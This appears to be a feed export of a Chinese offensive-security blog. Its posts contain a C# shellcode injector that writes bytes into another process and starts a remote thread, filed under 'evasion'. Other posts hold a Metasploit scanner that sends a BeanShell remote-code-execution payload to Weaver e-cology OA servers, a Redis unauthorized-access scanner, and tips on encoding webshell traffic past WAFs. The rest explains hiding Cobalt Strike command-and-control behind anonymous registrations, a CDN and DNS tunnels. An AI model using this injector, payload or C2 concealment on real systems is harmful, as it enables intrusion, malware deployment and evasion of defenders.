class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">OpenProcess</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> processAccess, <span class="hljs-built_in">bool</span> bInheritHandle, <span class="hljs-built_in">int</span></span></span><br><span class="hljs-params"><span class="hljs-function">processId</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>, SetLastError = true, ExactSpelling = true)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAllocEx</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpAddress, <span class="hljs-built_in">uint</span></span></span><br><span class="hljs-params"><span class="hljs-function">dwSize, <span class="hljs-built_in">uint</span> flAllocationType, <span class="hljs-built_in">uint</span> flProtect</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">WriteProcessMemory</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpBaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-built_in">byte</span>[] lpBuffer, Int32 nSize, <span class="hljs-keyword">out</span> IntPtr lpNumberOfBytesWritten</span>)</span>;<br>[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateRemoteThread</span>(<span class="hljs-params">IntPtr hProcess, IntPtr</span></span><br><span class="hljs-params"><span class="hljs-function">lpThreadAttributes, <span class="hljs-built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="hljs-built_in">uint</span></span></span><br><span class="hljs-params"><span class="hljs-function">dwCreationFlags, IntPtr lpThreadId</span>)</span>;<br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span><br>&#123;<br>IntPtr hProcess = OpenProcess(<span class="hljs-number">0x001F0FFF</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">1668</span>);<br>IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);<br><span class="hljs-built_in">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">756</span>] &#123;<br>===replace <span class="hljs-keyword">this</span>===<br><span class="hljs-number">0xfc</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xcc</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0xa2</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd5</span><br>===replace <span class="hljs-keyword">this</span>===<br>&#125;;<br>IntPtr outSize;<br>WriteProcessMemory(hProcess, addr, buf, buf.Length, <span class="hljs-keyword">out</span> outSize);<br>IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span class="hljs-number">0</span>, addr,IntPtr.Zero, <span class="hljs-number">0</span>, IntPtr.Zero);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>evasion</category>
      
    </categories>
    
    
    <tags>
      
      <tag>evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05-msf的泛微OA-rce扫描模块</title>
    <link href="/2021/02/20/09-x/"/>
    <url>/2021/02/20/09-x/</url>
    
    <content type="html"><![CDATA[<p>写一个泛微OA的scanner扫描模块</p><p>这是python3的模块，使用方法是放到kali对应目录下：<code>/usr/share/metasploit-framework/modules/auxiliary/scanner/http/weaver_e_cology_rce_scanner.py</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># Copyright (c) 2003-2018 CORE Security Technologies</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This software is provided under under a slightly modified version</span><br><span class="hljs-comment"># of the Apache Software License. See the accompanying LICENSE file</span><br><span class="hljs-comment"># for more information.</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> metasploit.module <span class="hljs-keyword">as</span> module<br><br>metadata = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;weaver e-cology oa system rce&#x27;</span>,<br>    <span class="hljs-string">&#x27;description&#x27;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;weaver e-cology oa system &lt;=9.0 remote code execution&#x27;&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;authors&#x27;</span>: [<span class="hljs-string">&#x27;whale3070&#x27;</span>],<br>    <span class="hljs-string">&#x27;date&#x27;</span>: <span class="hljs-string">&#x27;2021-02-19&#x27;</span>,<br>    <span class="hljs-string">&#x27;license&#x27;</span>: <span class="hljs-string">&#x27;CORE_LICENSE&#x27;</span>,<br>    <span class="hljs-string">&#x27;references&#x27;</span>: [<br>        &#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;ref&#x27;</span>: <span class="hljs-string">&#x27;https://whale3070.github.io/&#x27;</span>&#125;,<br>     ],<br>    <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;single_scanner&#x27;</span>,<br>    <span class="hljs-string">&#x27;options&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;RPORT&#x27;</span>: &#123;<span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;description&#x27;</span>: <span class="hljs-string">&#x27;PORT&#x27;</span>, <span class="hljs-string">&#x27;required&#x27;</span>: <span class="hljs-literal">True</span>&#125;<br>    &#125;,<br>    <span class="hljs-string">&#x27;notes&#x27;</span>: &#123;<br>        <span class="hljs-string">&#x27;AKA&#x27;</span>: [<span class="hljs-string">&#x27;weaver_e_cology_rce_scanner.py&#x27;</span>]<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">log</span>(<span class="hljs-params">message, level=<span class="hljs-string">&#x27;info&#x27;</span></span>):</span><br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string">                &#123;</span><br><span class="hljs-string">                    &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;message&quot;, &quot;params&quot;:</span><br><span class="hljs-string">                    &#123;</span><br><span class="hljs-string">                        &quot;level&quot;: &quot;%s&quot;,</span><br><span class="hljs-string">                        &quot;message&quot;: &quot;%s&quot;</span><br><span class="hljs-string">                    &#125;</span><br><span class="hljs-string">                &#125;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span> % (level, message)<br>    )<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">single_url</span>(<span class="hljs-params">rhost, rport</span>):</span><br>    request_url = <span class="hljs-string">&#x27;http://&#x27;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/weaver/bsh.servlet.BshServlet&quot;</span><br>    vuln_url = request_url<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0&quot;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&quot;43&quot;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&quot;%s&quot;</span> % vuln_url,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&quot;close&quot;</span><br>    &#125;<br>    payload = <span class="hljs-string">r&#x27;&#x27;&#x27;bsh.script=print(Interpreter.VERSION);%53%74%72%69%6e%67%20%4f%53%20%3d%20%53%79%73%74%65%6d%2e%67%65%74%50%72%6f%70%65%72%74%69%65%73%28%29%2e%67%65%74%50%72%6f%70%65%72%74%79%28%22%6f%73%2e%6e%61%6d%65%22%29%3b%0d%0a%70%72%69%6e%74%28%4f%53%29%3bpwd()&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(url=vuln_url, data=payload, headers=headers, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">r&#x27;getProperty&#x27;</span> <span class="hljs-keyword">in</span> r.content:<br>            log(<span class="hljs-string">&quot;Found weaver e-cology RCE in &quot;</span> + vuln_url, <span class="hljs-string">&#x27;good&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            log(<span class="hljs-string">&quot;Not found weaver e-cology RCE in &quot;</span> + vuln_url, <span class="hljs-string">&#x27;warning&#x27;</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        log(<span class="hljs-string">&quot;Not found weaver e-cology RCE in &quot;</span> + vuln_url, <span class="hljs-string">&#x27;warning&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">args</span>):</span><br>    <span class="hljs-comment"># formatted_args = &#123;&#125;</span><br>    <span class="hljs-comment"># for key, value in args.items():</span><br>    <span class="hljs-comment">#     formatted_args[str.upper(key)] = value</span><br>    <span class="hljs-comment"># log(str(formatted_args), &#x27;good&#x27;)</span><br>    rhost = args[<span class="hljs-string">&#x27;rhost&#x27;</span>]<br>    rport = args[<span class="hljs-string">&#x27;RPORT&#x27;</span>]<br>    single_url(rhost, rport)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    module.run(metadata, run)<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>metasploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应届生的面试题（四）</title>
    <link href="/2021/02/20/10-x/"/>
    <url>/2021/02/20/10-x/</url>
    
    <content type="html"><![CDATA[<h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>、绕WAF<br><span class="hljs-number">2</span>、反序列化   fastjson<br><span class="hljs-number">3</span>、流量加密<br><span class="hljs-number">4</span>、XXE<br><span class="hljs-number">5</span>、命令执行   php&amp;<span class="hljs-keyword">java的区别</span><br><span class="hljs-keyword"></span><span class="hljs-number">6</span>、溯源<br><span class="hljs-number">7</span>、中间件<br><span class="hljs-number">8</span>、代码审计<br><span class="hljs-number">7</span>、注入<br><span class="hljs-number">8</span>、SSRF<br><span class="hljs-number">9</span>、内网要怎么打<br><br><span class="hljs-number">1</span>.证书透明<br><span class="hljs-number">2</span>.Windows的Redis主从RCE<br><span class="hljs-number">3</span>.PTH怎么利用和NTML验证端口是什么<br><span class="hljs-number">4</span>.git和svn，svn<br><span class="hljs-number">5</span>.CS怎么联动C<span class="hljs-comment">#来进程注入</span><br><span class="hljs-number">6</span>.<span class="hljs-keyword">JNDI有哪些利用协议</span><br><span class="hljs-keyword"></span><span class="hljs-number">7</span>.fastjson有哪些gadget<br><span class="hljs-number">8</span>.<span class="hljs-keyword">Shiro有哪些常见漏洞，Padding </span><span class="hljs-keyword">Oracle的利用条件是什么，加密方式是什么</span><br><span class="hljs-keyword"></span><span class="hljs-number">9</span>.RMI的漏洞有没有接触过<br><span class="hljs-number">10</span>.Linux和Windows有什么提权方式，Windows令牌窃取普通用户可以利用吗，为什么不能利用<br><span class="hljs-number">11</span>.ThinkPHP3有哪些漏洞，ThinkPHP5的路由控制不严谨导致的RCE有没有利用过<br><span class="hljs-number">12</span>.有没有钓鱼经历，如果和室友同在一台路由器下，有什么横向移动方法<br></code></pre></div></td></tr></table></figure><h2 id="webshell流量加密"><a href="#webshell流量加密" class="headerlink" title="webshell流量加密"></a>webshell流量加密</h2><p>我录制的视频：</p><ul><li><a href="https://www.bilibili.com/video/BV1FA411H7UU/">antsword服务器管理</a></li><li><a href="https://www.bilibili.com/video/BV1DT4y1w7Bb/">antsword自定义编码器</a></li></ul><p>webshell通信如果是明文，可以被安全软件直接拦截。如果使用冰蝎之类的webshell管理软件，也容易被提取特征，此处可以用antsword自定义的编码器来过waf。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-20-10/3.PNG"></p><p>图片中是网络上搜集到的自定义编码器，github上可以自行寻找。也可以自行编写自定义编码器<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-20-10/4.PNG"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-20-10/2.PNG"></p>]]></content>
    
    
    <categories>
      
      <category>Interview</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Interview</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04-redis未授权扫描模块</title>
    <link href="/2021/02/11/08-x/"/>
    <url>/2021/02/11/08-x/</url>
    
    <content type="html"><![CDATA[<h2 id="需要的资料"><a href="#需要的资料" class="headerlink" title="需要的资料"></a>需要的资料</h2><ul><li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Redis#redis_command-instance_method">msf开发文档</a></li><li>metasploit</li><li>脚本开发基础知识，<a href="https://www.runoob.com/ruby/ruby-tutorial.html">ruby语法</a></li><li><a href="https://www.bilibili.com/video/BV1np4y1p79e">Shodan搜索引擎介绍、以及如何在Linux命令行安装</a></li><li><a href="https://www.bilibili.com/video/BV1Wt4y1X7XQ?from=search&seid=282355040030159908">redis未授权访问漏洞复现</a></li></ul><h2 id="课程结构"><a href="#课程结构" class="headerlink" title="课程结构"></a>课程结构</h2><ul><li>shodan被动信息搜集，寻找有redis服务的主机</li><li>metasploit改插件，判断是否存在redis漏洞</li><li>验证漏洞扫描结果</li><li>总结</li></ul><h2 id="录制的视频"><a href="#录制的视频" class="headerlink" title="录制的视频"></a>录制的视频</h2><p><a href="https://www.bilibili.com/video/BV1tU4y1W77M">msf开发实践（一）redis未授权扫描模块</a></p><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><br><span class="hljs-comment">##</span><br><span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span><br><span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Auxiliary</span><br>  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::Tcp<br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::Redis<br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::Report<br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::Scanner<br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = &#123;&#125;)</span></span><br>    <span class="hljs-keyword">super</span>(update_info(info,<br>      <span class="hljs-string">&#x27;Name&#x27;</span>         =&gt; <span class="hljs-string">&#x27;Redis Unauthorized Scanner&#x27;</span>,<br>      <span class="hljs-string">&#x27;Description&#x27;</span>  =&gt; <span class="hljs-string">%q(</span><br><span class="hljs-string">        This module finds Redis Unauthorized vulnerability.</span><br><span class="hljs-string">      )</span>,<br>      <span class="hljs-string">&#x27;Author&#x27;</span>       =&gt; [ <span class="hljs-string">&#x27;weaponmaster3070@gmail.com&#x27;</span>, <span class="hljs-string">&#x27;whale3070&#x27;</span> ],<br>      <span class="hljs-string">&#x27;License&#x27;</span>      =&gt; MSF_LICENSE))<br><br>    register_options(<br>      [<br>        Opt::RPORT(<span class="hljs-number">6379</span>),<br>        OptString.new(<span class="hljs-string">&#x27;COMMAND&#x27;</span>, [ <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The Redis command to run&#x27;</span>, <span class="hljs-string">&#x27;INFO&#x27;</span> ])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">command</span></span><br>    datastore[<span class="hljs-string">&#x27;COMMAND&#x27;</span>]<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_host</span><span class="hljs-params">(_ip)</span></span><br>    vprint_status(<span class="hljs-string">&quot;Contacting redis&quot;</span>)<br>    <span class="hljs-keyword">begin</span><br>      connect  <span class="hljs-comment">#Establishes a TCP connection to the specified RHOST/RPORT</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> (data = redis_command(command))<br>      <span class="hljs-comment">#puts data</span><br>      <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;redis_version&quot;</span>]<br>          report_service(<span class="hljs-symbol">host:</span> rhost, <span class="hljs-symbol">port:</span> rport, <span class="hljs-symbol">name:</span> <span class="hljs-string">&quot;redis server&quot;</span>, <span class="hljs-symbol">info:</span> <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;command&#125;</span> response: <span class="hljs-subst">#&#123;data&#125;</span>&quot;</span>) <span class="hljs-comment">#store in the msf database</span><br>          print_good(<span class="hljs-string">&quot;Found redis with <span class="hljs-subst">#&#123;command&#125;</span> command: <span class="hljs-subst">#&#123;Rex::Text.to_hex_ascii(data)&#125;</span>&quot;</span>)<br>      <span class="hljs-keyword">else</span> <br>          puts <span class="hljs-string">&#x27;[-]not found redis_Unauthorized&#x27;</span> <br>      <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">rescue</span> Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout,<br>           Rex::ConnectionRefused, <span class="hljs-symbol">:</span><span class="hljs-symbol">:Timeout</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Error</span>, <span class="hljs-symbol">:</span><span class="hljs-symbol">:EOFError</span>, <span class="hljs-symbol">:</span><span class="hljs-symbol">:Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:ETIMEDOUT</span> =&gt; e<br>      vprint_error(<span class="hljs-string">&quot;Error while communicating: <span class="hljs-subst">#&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">ensure</span><br>      disconnect<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h2 id="下一步计划"><a href="#下一步计划" class="headerlink" title="下一步计划"></a>下一步计划</h2><p>编写weblogic扫描模块</p>]]></content>
    
    
    <categories>
      
      <category>metasploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobaltstrike通过域名上线（六）</title>
    <link href="/2021/02/06/12-x/"/>
    <url>/2021/02/06/12-x/</url>
    
    <content type="html"><![CDATA[<h2 id="匿名邮箱注册"><a href="#匿名邮箱注册" class="headerlink" title="匿名邮箱注册"></a>匿名邮箱注册</h2><p><a href="https://mail.protonmail.com/login">https://mail.protonmail.com/login</a></p><h2 id="注册免费域名"><a href="#注册免费域名" class="headerlink" title="注册免费域名"></a>注册免费域名</h2><p><a href="http://www.freenom.com/en/index.html">http://www.freenom.com/en/index.html</a></p><h2 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h2><p>注册一个cloudflare账号，将注册好的域名解析到ip</p><p><a href="https://dash.cloudflare.com/login">https://dash.cloudflare.com/login</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-06-12/123.PNG" alt="123"></p><p>具体怎么配置，查看这篇文章： <a href="https://www.cnblogs.com/ichochy/p/11652961.html">通过Cloudflare开启全站https</a></p><h2 id="cobaltstrike域名上线"><a href="#cobaltstrike域名上线" class="headerlink" title="cobaltstrike域名上线"></a>cobaltstrike域名上线</h2><p>botnet(https) -&gt; cdn -&gt;nginx(https) -&gt; c2</p><p>监听器配置为域名<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-06-12/1.PNG" alt="1"></p><p>然后正常生成exe或者powershell一句话上线</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Trojan 共用 443 端口方案<a href="https://www.chengxiaobai.cn/record/trojan-shared-443-port-scheme.html">https://www.chengxiaobai.cn/record/trojan-shared-443-port-scheme.html</a></p><p>担心VPS被墙？永不被墙IP的Trojan搭建教程<a href="https://www.v2rayssr.com/trojan-go.html">https://www.v2rayssr.com/trojan-go.html</a></p><p>trojan教程<a href="https://tlanyan.me/trojan-tutorial/">https://tlanyan.me/trojan-tutorial/</a></p><p>Trojan-Go <a href="https://github.com/p4gefau1t/trojan-go">https://github.com/p4gefau1t/trojan-go</a></p><p>Nginx与Trojan共用443 <a href="https://www.jianshu.com/p/dd2307a6bf02">https://www.jianshu.com/p/dd2307a6bf02</a></p><ul><li><p><a href="http://www.xinnet.com/xinnews/domain/40047.html">永久免费域名申请</a></p></li><li><p><a href="https://myzxcg.com/20201213.html">Cobalt Strike去特征：配置Nginx反向代理、CDN与Cloudflare Worker</a></p></li><li><p><a href="https://paper.seebug.org/1349/#_2">Cobalt Strike 绕过流量审计</a></p></li><li><p><a href="https://www.c0bra.xyz/2019/12/17/Cobalt-Strike%E7%B3%BB%E5%88%9710/">cs域名上线</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cobaltstrike dns隧道的上线</title>
    <link href="/2021/02/05/11-x/"/>
    <url>/2021/02/05/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>要理解cobaltstrike dns隧道的上线过程，首先要理解dns协议。</p><p>Domain Name System，dns是域名系统的缩写。默认使用的是53端口。</p><p>dns隧道使用的场景是在一个严格的内网环境，安全设备或者策略不允许其他端口出网，但是使用nslookup命令，发现可以使用dns协议，可以向外部的dns服务器发送请求，来进行外部域名解析。</p><p>外部域名解析也就是一个域名转换为IP的行为。</p><p>首先我们要了解一点dns记录的知识：</p><p><code>A记录</code>： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p><p><code>NS记录</code>： NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p><h2 id="dns隧道连接过程"><a href="#dns隧道连接过程" class="headerlink" title="dns隧道连接过程"></a>dns隧道连接过程</h2><p>1.被控端收到命令之后，向自己记录的dns服务器请求解析域名。</p><p>2.内网dns收到请求之后找不到该域名，将请求交给权威域名服务器查询。</p><p>3.权威域名服务器向其他服务器同步请求。</p><p>4.找到对应的ip为自己的cs服务器，解析请求，实现dns数据链路传输。</p><h2 id="dns配置"><a href="#dns配置" class="headerlink" title="dns配置"></a>dns配置</h2><p>为了让靶机通过域名上线，所以我们首先要注册一个域名。</p><p>匿名邮箱注册、域名注册（省略）</p><p>域名解析记录：可以查看域名提供商的帮助文档，例如<a href="https://help.aliyun.com/knowledge_detail/29725.html">阿里云帮助文档</a>来添加对应的域名解析记录</p><p>创建一条A记录，将域名指向teamserver的IP<br>例如 <a href="http://www.attack.com/">www.attack.com</a> 指向 192.168.1.1</p><p>创建一条NS记录，将域名test.attack.com指向域名<a 